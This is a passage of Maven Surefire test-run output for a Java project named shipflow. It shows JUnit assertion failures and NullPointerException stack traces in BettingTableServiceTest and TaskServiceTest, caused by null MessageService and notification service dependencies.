	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122)
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385)
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162)
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507)
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495)

	at com.github.farzadsedaghatbin.shipflow.service.BettingTableServiceTest.generateSlotsForCycle_WhenNoTeams_ShouldThrowException(BettingTableServiceTest.java:380)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)

[ERROR] com.github.farzadsedaghatbin.shipflow.service.BettingTableServiceTest.assignPitchToSlot_WhenPitchTooLarge_ShouldThrowException -- Time elapsed: 0.001 s <<< FAILURE!
java.lang.AssertionError: 

Expecting throwable message:
  "Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String, Object[])" because "this.messageService" is null"
to contain:
  "requires 14 days"
but did not.

Throwable that failed the check:

java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String, Object[])" because "this.messageService" is null
	at com.github.farzadsedaghatbin.shipflow.service.BettingTableService.validatePitchFits(BettingTableService.java:386)
	at com.github.farzadsedaghatbin.shipflow.service.BettingTableService.assignPitchToSlot(BettingTableService.java:220)
	at com.github.farzadsedaghatbin.shipflow.service.BettingTableServiceTest.lambda$assignPitchToSlot_WhenPitchTooLarge_ShouldThrowException$4(BettingTableServiceTest.java:226)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	at org.assertj.core.api.AssertionsForClassTypes.catchThrowable(AssertionsForClassTypes.java:892)
	at org.assertj.core.api.Assertions.catchThrowable(Assertions.java:1366)
	at org.assertj.core.api.Assertions.assertThatThrownBy(Assertions.java:1210)
	at com.github.farzadsedaghatbin.shipflow.service.BettingTableServiceTest.assignPitchToSlot_WhenPitchTooLarge_ShouldThrowException(BettingTableServiceTest.java:226)
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728)
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131)
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85)
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47)
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122)
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385)
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162)
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507)
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495)

	at com.github.farzadsedaghatbin.shipflow.service.BettingTableServiceTest.assignPitchToSlot_WhenPitchTooLarge_ShouldThrowException(BettingTableServiceTest.java:228)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)

[ERROR] com.github.farzadsedaghatbin.shipflow.service.BettingTableServiceTest.updateSlotDates_WhenOutsideCycle_ShouldThrowException -- Time elapsed: 0.001 s <<< FAILURE!
java.lang.AssertionError: 

Expecting throwable message:
  "Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String, Object[])" because "this.messageService" is null"
to contain:
  "within cycle dates"
but did not.

Throwable that failed the check:

java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String, Object[])" because "this.messageService" is null
	at com.github.farzadsedaghatbin.shipflow.service.BettingTableService.updateSlotDates(BettingTableService.java:330)
	at com.github.farzadsedaghatbin.shipflow.service.BettingTableServiceTest.lambda$updateSlotDates_WhenOutsideCycle_ShouldThrowException$9(BettingTableServiceTest.java:289)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	at org.assertj.core.api.AssertionsForClassTypes.catchThrowable(AssertionsForClassTypes.java:892)
	at org.assertj.core.api.Assertions.catchThrowable(Assertions.java:1366)
	at org.assertj.core.api.Assertions.assertThatThrownBy(Assertions.java:1210)
	at com.github.farzadsedaghatbin.shipflow.service.BettingTableServiceTest.updateSlotDates_WhenOutsideCycle_ShouldThrowException(BettingTableServiceTest.java:289)
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728)
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131)
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85)
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47)
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122)
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385)
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162)
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507)
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495)

	at com.github.farzadsedaghatbin.shipflow.service.BettingTableServiceTest.updateSlotDates_WhenOutsideCycle_ShouldThrowException(BettingTableServiceTest.java:291)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)

[ERROR] com.github.farzadsedaghatbin.shipflow.service.BettingTableServiceTest.createSlot_WithDuplicatePosition_ShouldThrowException -- Time elapsed: 0.001 s <<< FAILURE!
java.lang.AssertionError: 

Expecting throwable message:
  "Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String, Object[])" because "this.messageService" is null"
to contain:
  "already exists"
but did not.

Throwable that failed the check:

java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.MessageService.getMessage(String, Object[])" because "this.messageService" is null
	at com.github.farzadsedaghatbin.shipflow.service.BettingTableService.lambda$createSlot$13(BettingTableService.java:143)
	at java.base/java.util.Optional.ifPresent(Optional.java:178)
	at com.github.farzadsedaghatbin.shipflow.service.BettingTableService.createSlot(BettingTableService.java:141)
	at com.github.farzadsedaghatbin.shipflow.service.BettingTableServiceTest.lambda$createSlot_WithDuplicatePosition_ShouldThrowException$2(BettingTableServiceTest.java:190)
	at org.assertj.core.api.ThrowableAssert.catchThrowable(ThrowableAssert.java:63)
	at org.assertj.core.api.AssertionsForClassTypes.catchThrowable(AssertionsForClassTypes.java:892)
	at org.assertj.core.api.Assertions.catchThrowable(Assertions.java:1366)
	at org.assertj.core.api.Assertions.assertThatThrownBy(Assertions.java:1210)
	at com.github.farzadsedaghatbin.shipflow.service.BettingTableServiceTest.createSlot_WithDuplicatePosition_ShouldThrowException(BettingTableServiceTest.java:190)
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728)
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131)
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147)
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.chainAndInvoke(InvocationInterceptorChain.java:45)
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.invoke(InvocationInterceptorChain.java:37)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:92)
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.invoke(InterceptingExecutableInvoker.java:86)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.lambda$invokeTestMethod$7(TestMethodTestDescriptor.java:218)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.invokeTestMethod(TestMethodTestDescriptor.java:214)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:139)
	at org.junit.jupiter.engine.descriptor.TestMethodTestDescriptor.execute(TestMethodTestDescriptor.java:69)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:151)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.invokeAll(SameThreadHierarchicalTestExecutorService.java:41)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$6(NodeTestTask.java:155)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$8(NodeTestTask.java:141)
	at org.junit.platform.engine.support.hierarchical.Node.around(Node.java:137)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.lambda$executeRecursively$9(NodeTestTask.java:139)
	at org.junit.platform.engine.support.hierarchical.ThrowableCollector.execute(ThrowableCollector.java:73)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.executeRecursively(NodeTestTask.java:138)
	at org.junit.platform.engine.support.hierarchical.NodeTestTask.execute(NodeTestTask.java:95)
	at org.junit.platform.engine.support.hierarchical.SameThreadHierarchicalTestExecutorService.submit(SameThreadHierarchicalTestExecutorService.java:35)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestExecutor.execute(HierarchicalTestExecutor.java:57)
	at org.junit.platform.engine.support.hierarchical.HierarchicalTestEngine.execute(HierarchicalTestEngine.java:54)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:198)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:169)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:93)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.lambda$execute$0(EngineExecutionOrchestrator.java:58)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.withInterceptedStreams(EngineExecutionOrchestrator.java:141)
	at org.junit.platform.launcher.core.EngineExecutionOrchestrator.execute(EngineExecutionOrchestrator.java:57)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:103)
	at org.junit.platform.launcher.core.DefaultLauncher.execute(DefaultLauncher.java:85)
	at org.junit.platform.launcher.core.DelegatingLauncher.execute(DelegatingLauncher.java:47)
	at org.apache.maven.surefire.junitplatform.LazyLauncher.execute(LazyLauncher.java:56)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.execute(JUnitPlatformProvider.java:184)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invokeAllTests(JUnitPlatformProvider.java:148)
	at org.apache.maven.surefire.junitplatform.JUnitPlatformProvider.invoke(JUnitPlatformProvider.java:122)
	at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:385)
	at org.apache.maven.surefire.booter.ForkedBooter.execute(ForkedBooter.java:162)
	at org.apache.maven.surefire.booter.ForkedBooter.run(ForkedBooter.java:507)
	at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:495)

	at com.github.farzadsedaghatbin.shipflow.service.BettingTableServiceTest.createSlot_WithDuplicatePosition_ShouldThrowException(BettingTableServiceTest.java:192)
	at java.base/java.lang.reflect.Method.invoke(Method.java:580)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)
	at java.base/java.util.ArrayList.forEach(ArrayList.java:1596)

[INFO] Running com.github.farzadsedaghatbin.shipflow.service.TaskServiceTest
2026-01-17T23:26:49.288Z ERROR 89700 --- [shipflow] [           main] c.g.f.shipflow.service.TaskService       : Failed to send task update notifications for task 1

java.lang.NullPointerException: Cannot invoke "com.github.farzadsedaghatbin.shipflow.service.DashboardNotificationService.notifyTaskPriorityChange(com.github.farzadsedaghatbin.shipflow.entity.Task, com.github.farzadsedaghatbin.shipflow.entity.enums.TaskPriority)" because "this.notificationService" is null
	at com.github.farzadsedaghatbin.shipflow.service.TaskService.updateTask(TaskService.java:327) ~[classes/:na]
	at com.github.farzadsedaghatbin.shipflow.service.TaskServiceTest.updateTask_ShouldUpdateCategory(TaskServiceTest.java:344) ~[test-classes/:na]
	at java.base/jdk.internal.reflect.DirectMethodHandleAccessor.invoke(DirectMethodHandleAccessor.java:103) ~[na:na]
	at java.base/java.lang.reflect.Method.invoke(Method.java:580) ~[na:na]
	at org.junit.platform.commons.util.ReflectionUtils.invokeMethod(ReflectionUtils.java:728) ~[junit-platform-commons-1.10.1.jar:1.10.1]
	at org.junit.jupiter.engine.execution.MethodInvocation.proceed(MethodInvocation.java:60) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$ValidatingInvocation.proceed(InvocationInterceptorChain.java:131) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.intercept(TimeoutExtension.java:156) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestableMethod(TimeoutExtension.java:147) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.extension.TimeoutExtension.interceptTestMethod(TimeoutExtension.java:86) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker$ReflectiveInterceptorCall.lambda$ofVoidMethod$0(InterceptingExecutableInvoker.java:103) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InterceptingExecutableInvoker.lambda$invoke$0(InterceptingExecutableInvoker.java:93) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain$InterceptedInvocation.proceed(InvocationInterceptorChain.java:106) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
	at org.junit.jupiter.engine.execution.InvocationInterceptorChain.proceed(InvocationInterceptorChain.java:64) ~[junit-jupiter-engine-5.10.1.jar:5.10.1]
